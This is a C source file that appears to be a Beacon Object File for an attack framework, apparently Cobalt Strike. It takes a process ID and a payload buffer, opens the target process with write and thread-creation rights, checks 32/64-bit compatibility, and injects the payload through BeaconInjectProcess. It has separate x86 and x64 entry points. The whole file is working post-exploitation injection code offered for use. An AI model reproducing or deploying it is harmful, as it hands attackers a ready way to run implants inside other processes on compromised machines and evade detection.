#include <windows.h>
#include "beacon.h"

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
    return TRUE;
#elif defined _M_IX86
    return FALSE;
#endif
}

/* is this a 64-bit or 32-bit process? */
BOOL is_wow64(HANDLE process) {
    BOOL bIsWow64 = FALSE;

    if (!IsWow64Process(process, &bIsWow64)) {
        return FALSE;
    }

    return bIsWow64;
}

/* check if a process is x64 or not */
BOOL is_x64_process(HANDLE process) {
    if (is_x64() || is_wow64(GetCurrentProcess())) {
        return !is_wow64(process);
    }

    return FALSE;
}

void go(char* args, int len, BOOL x86) {
    HANDLE hProcess;
    datap  parser;
    int    pid;
    int    offset;
    char*  dllPtr;
    int    dllLen;
    char*  argPtr;
    int    argLen;

    /* Extract the arguments */
    BeaconDataParse(&parser, args, len);
    pid    = BeaconDataInt(&parser);
    offset = BeaconDataInt(&parser);
    dllPtr = BeaconDataExtract(&parser, &dllLen);
    argPtr = BeaconDataExtract(&parser, &argLen);

    /* Open a handle to the process, for injection. */
    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE,
        pid);

    if (hProcess == INVALID_HANDLE_VALUE || hProcess == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to open process %d : %d", pid, GetLastError());
        return;
    }

    /* Check that we can inject the content into the process. */
    if (!is_x64_process(hProcess) && x86 == FALSE) {
        BeaconPrintf(CALLBACK_ERROR, "%d is an x86 process (can't inject x64 content)", pid);
        return;
    }
    if (is_x64_process(hProcess) && x86 == TRUE) {
        BeaconPrintf(CALLBACK_ERROR, "%d is an x64 process (can't inject x86 content)", pid);
        return;
    }

    /* inject into the process */
    BeaconInjectProcess(hProcess, pid, dllPtr, dllLen, offset, argPtr, argLen);

    BeaconPrintf( CALLBACK_OUTPUT, "injected payload into %d via inject-kit", pid );

    /* Clean up */
    CloseHandle(hProcess);
}

extern "C" void gox86(char* args, int alen) {
    go(args, alen, TRUE);
}

extern "C" void gox64(char* args, int alen) {
    go(args, alen, FALSE);
}
